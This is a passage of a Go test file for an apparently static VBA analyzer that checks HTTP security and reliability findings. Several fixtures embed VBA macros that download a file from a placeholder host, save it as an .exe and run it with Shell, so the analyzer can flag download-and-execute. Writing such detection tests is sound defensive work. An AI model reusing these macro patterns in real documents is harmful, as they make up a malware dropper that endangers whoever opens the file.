	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Dim aliasRequest As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    Set aliasRequest = request
    For i = 1 To 2
        aliasRequest.SetTimeouts 1000, 1000, 1000, 1000
    Next i
    request.Open "GET", "https://example.test", False
    request.Send
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	if got := findingsByCode(findings, "VBA247"); len(got) != 0 {
		t.Fatalf("finite timeout through loop alias produced findings: %+v", got)
	}
}

func TestHTTPCompactSaveEvidencePropagatesToStreamAliases(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Dim stream As ADODB.Stream
    Dim aliasStream As ADODB.Stream
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.Open "GET", "https://example.test/payload", False
    request.Send
    Set stream = New ADODB.Stream
    Set aliasStream = stream
    aliasStream.Write request.ResponseBody
    aliasStream.SaveToFile "C:\Temp\payload.exe", 2
    Shell "C:\Temp\payload.exe"
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findingsByCode(findings, "VBA246") {
		if finding.HTTPSecurity != nil && finding.HTTPSecurity.RiskKind == "download_and_execute" {
			return
		}
	}
	t.Fatalf("alias SaveToFile did not produce download_and_execute: %+v", findings)
}

func TestHTTPCompactSkipsUnreachableStatements(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    Exit Sub
    Debug.Print "Bearer unreachable-token"
    request.Open "GET", "http://user:password@example.test", False
    request.Send
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	if got := findingsByCode(findings, "VBA246"); len(got) != 0 {
		t.Fatalf("unreachable HTTP statement produced findings: %+v", got)
	}
}

func TestHTTPCompactIntersectsSavedPathsAcrossDifferentSites(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run(ByVal chooseFirst As Boolean)
	Dim request As Object
	Dim stream As ADODB.Stream
	Dim savePath As String
	Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
	request.Open "GET", "https://example.test/payload", False
	request.Send
	Set stream = New ADODB.Stream
	stream.Write request.ResponseBody
	savePath = "C:\Temp\same.exe"
	If chooseFirst Then
		stream . SaveToFile savePath, 2
	Else
		stream . SaveToFile savePath, 2
	End If
	Shell savePath
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findingsByCode(findings, "VBA246") {
		if finding.HTTPSecurity != nil && finding.HTTPSecurity.RiskKind == "download_and_execute" {
			return
		}
	}
	t.Fatalf("same path at different SaveToFile sites was lost: %+v", findings)
}

func TestHTTPCompactUncertainIdentityPreservesVBA224Ownership(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run(ByVal chooseClient As Boolean)
    Dim request As Object
    If chooseClient Then
        Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    Else
        Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    End If
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "http://example.test", False
    request.SetRequestHeader "Authorization", InputBox("Token")
    request.Send
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	if got := findingsByCode(findings, "VBA246"); len(got) == 0 {
		t.Fatalf("missing specialized uncertain-identity finding: %+v", findings)
	}
	if got := findingsByCode(findings, "VBA224"); len(got) != 0 {
		t.Fatalf("VBA224 was not suppressed by uncertain-identity sink ownership: %+v", got)
	}
}

func TestHTTPCompactBatchAndRealtimeOrderingMatch(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	source := `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.Open "GET", "http://example.test", False, "user", "password"
    request.Send
End Sub
`
	writeModule(t, dir, "Main.bas", source)
	cfg := config.Default()
	batch, err := (Analyzer{RootDir: dir, Config: cfg}).Run()
	if err != nil {
		t.Fatal(err)
	}
	realtime, err := runRealtimeForSingleModule(t, dir, cfg, "Main.bas")
	if err != nil {
		t.Fatal(err)
	}
	if got, want := httpFindingDigest(batch), httpFindingDigest(realtime); !reflect.DeepEqual(got, want) {
		t.Fatalf("batch/realtime HTTP digest differs:\n batch=%#v\n realtime=%#v", got, want)
	}
}

func httpFindingDigest(findings []Finding) []string {
	digest := make([]string, 0, len(findings))
	for _, finding := range findings {
		api, risk, header, origin, timeout := "", "", "", "", ""
		if finding.HTTPSecurity != nil {
			api, risk, header, origin = finding.HTTPSecurity.API, finding.HTTPSecurity.RiskKind, finding.HTTPSecurity.Header, finding.HTTPSecurity.Origin
		}
		if finding.HTTPReliability != nil {
			api, risk, timeout = finding.HTTPReliability.API, finding.HTTPReliability.RiskKind, finding.HTTPReliability.TimeoutState
		}
		owned := make([]int, 0, len(finding.httpOwnedSinks))
		for sink, present := range finding.httpOwnedSinks {
			if present {
				owned = append(owned, sink)
			}
		}
		sort.Ints(owned)
		ownedDigest := make([]string, 0, len(owned))
		for _, sink := range owned {
			ownedDigest = append(ownedDigest, strconv.Itoa(sink))
		}
		// Keep the differential oracle sensitive to the public diagnostic
		// contract: order/multiplicity, range, severity, redacted witness
		// projection, and HTTP context fields all participate in the digest.
		digest = append(digest, fmt.Sprintf("%s|%s|%s|%s|%d|%d|%d|%d|%s|%s|%s|%s|%s|%s|%s", finding.Code, finding.Severity, finding.File, finding.Procedure, finding.Line, finding.Column, finding.EndLine, finding.EndColumn, api, risk, header, origin, timeout, strings.Join(finding.NearbyCode, "\x1f"), strings.Join(ownedDigest, ",")))
	}
	return digest
}
